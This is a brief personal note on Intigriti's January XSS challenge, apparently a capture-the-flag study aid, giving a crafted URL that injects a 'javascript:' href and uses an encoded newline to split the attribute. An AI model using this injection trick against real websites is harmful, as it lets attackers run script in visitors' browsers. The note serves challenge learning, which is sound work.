- Intigriti's January XSS Challenge Explained (youtube)

==Split href attribute `<a href="r=*";==
```url
javascript.challenge-0121.intigtiti.io/?r=Javascript:alert(flag.innerHTML)/%0aid=origin

%0a -> encoded url for new line (burp decoder used!)
```
